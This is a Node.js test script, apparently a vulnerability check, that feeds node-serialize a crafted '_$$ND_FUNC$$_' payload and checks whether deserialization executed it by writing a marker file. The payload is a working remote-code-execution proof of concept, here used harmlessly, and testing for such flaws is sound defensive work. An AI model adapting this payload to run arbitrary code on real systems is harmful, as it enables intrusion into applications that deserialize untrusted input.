if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const serialize = require("node-serialize");
const path = "./node-serialize";
let payload =
	'{"rce":"_$$ND_FUNC$$_function (){require(`fs`).writeFileSync(`node-serialize`,``);}()"}';
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	serialize.unserialize(payload);
} catch (error) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
